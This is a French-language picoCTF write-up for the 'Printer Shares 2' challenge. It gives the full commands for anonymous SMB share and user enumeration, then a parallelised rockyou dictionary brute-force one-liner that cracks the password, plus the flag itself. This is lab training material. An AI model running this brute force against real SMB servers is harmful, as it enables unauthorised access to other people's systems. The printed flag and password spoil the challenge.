# Writeup PicoCTF - Printer Shares 2

**Challenge:** Printer Shares 2  
**Catégorie:** Network / SMB / Énumération  
**Points:** 200 pts  
**Flag:** `picoCTF{5mb_pr1nter_5h4re5_5ecure_4c41b548}`

## Description

Une imprimante sécurisée est maintenant en utilisation. Deux imprimantes sont sur le port 57989 : une publique, une privée. L'objectif est de récupérer le message secret stocké dans le partage sécurisé.

### Hints
- "default password is dangerous, isn't it?" 
- "can you find a potential user? What is the username?"
- "the wordlist, rockyou.txt, is pretty common for password cracking"

## Solution

### Étape 1: Vérification de la connectivité

```bash
nc -vz green-hill.picoctf.net 57989
```

Le service SMB est accessible sur le port 57989.

### Étape 2: Énumération des partages

```bash
smbclient -L //green-hill.picoctf.net -p 57989 -N
```

**Résultat:**
- `shares`: Public Share With Guests (partage public)
- `secure-shares`: Printer for internal usage only (partage sécurisé)
- `IPC$`: Service IPC

### Étape 3: Exploration du partage public

```bash
smbclient //green-hill.picoctf.net/shares -p 57989 -N -c "ls"
```

**Fichiers trouvés:**
- `content.txt` (1107 bytes)
- `kafka.txt` (1080 bytes)
- `notification.txt` (260 bytes)

**Contenu de notification.txt:**
```
Hi Joe,

We've identified a vulnerability in this printer. Until the issue is resolved, please use an alternative printer.

If you have never logged into the printer before, please note that the default password is currently in use.

Best,
The Operator Team
```

**Indice clé:** Le message est adressé à **Joe** → nom d'utilisateur probable = `joe`

### Étape 4: Énumération des utilisateurs SMB

```bash
rpcclient -U "" -N green-hill.picoctf.net -p 57989 -c "enumdomusers"
```

**Résultat:**
```
user:[joe] rid:[0x3e8]
```

Confirmation: l'utilisateur est **joe**

### Étape 5: Brute force du mot de passe

Utilisation de `rockyou-40.txt` avec parallélisation pour tester rapidement :

```bash
cat /home/aurel/CTF/rockyou-40.txt | xargs -P 20 -I {} bash -c \
'smbclient //green-hill.picoctf.net/secure-shares -p 57989 -U joe%{} \
-c "ls" 2>&1 | grep -q "blocks of size" && echo "[+] PASSWORD FOUND: {}"' | head -1
```

**Résultat:**
```
[+] PASSWORD FOUND: popcorn
```

**Mot de passe trouvé: popcorn**

### Étape 6: Accès au partage sécurisé

```bash
smbclient //green-hill.picoctf.net/secure-shares -p 57989 -U joe%popcorn -c "ls"
```

**Contenu du partage:**
```
.                      D        0  Mon Mar  9 21:29:12 2026
..                     D        0  Mon Mar  9 21:29:12 2026
flag.txt               N       44  Mon Mar  9 21:29:12 2026
```

### Étape 7: Extraction du flag

```bash
cd /tmp && smbclient //green-hill.picoctf.net/secure-shares -p 57989 -U joe%popcorn -c "get flag.txt"
cat flag.txt
```

**Flag obtained:**
```
picoCTF{5mb_pr1nter_5h4re5_5ecure_4c41b548}
```

## Concepts clés

1. **Énumération des partages SMB**: Utilisation de `smbclient -L` pour lister les ressources partagées
2. **Énumération des utilisateurs**: `rpcclient` avec NULL session pour découvrir les utilisateurs valides
3. **Reconnaissance via fichiers publics**: Les notifications contiennent des indices (nom d'utilisateur)
4. **Brute force optimisé**: Utilisation de `xargs -P` pour paralléliser les tentatives de connexion
5. **Attaque par dictionnaire**: Les mots de passe faibles dans rockyou sont très efficaces

## Outils utilisés

- `nc`: Vérification de connectivité
- `smbclient`: Interaction avec SMB
- `rpcclient`: Énumération SMB
- `xargs`: Parallélisation
- `bash`: Scripting

## Commandes résumées

```bash
# 1. Énumération
smbclient -L //green-hill.picoctf.net -p 57989 -N
rpcclient -U "" -N green-hill.picoctf.net -p 57989 -c "enumdomusers"

# 2. Brute force parallélisé
cat rockyou-40.txt | xargs -P 20 -I {} bash -c \
'smbclient //green-hill.picoctf.net/secure-shares -p 57989 -U joe%{} -c "ls" 2>&1 | \
grep -q "blocks of size" && echo "[+] PASSWORD FOUND: {}"'

# 3. Récupération du flag
smbclient //green-hill.picoctf.net/secure-shares -p 57989 -U joe%popcorn -c "get flag.txt"
```

## Difficultés rencontrées

- **SMBv1 désactivé**: Hydra ne fonctionne pas directement, dû à SMBv2
- **Lenteur des tentatives séquentielles**: Solution: parallélisation avec xargs (20 threads)
- **Timeouts**: Important de réduire le timeout à 1-2 secondes par tentative

## Leçons apprises

- Lire attentivement les hints (mention de "default password" et "username")
- Chercher des indices dans les fichiers accessibles publiquement
- Utiliser l'énumération avant le brute force pour cibler efficacement
- Paralléliser pour accélérer significativement les attaques
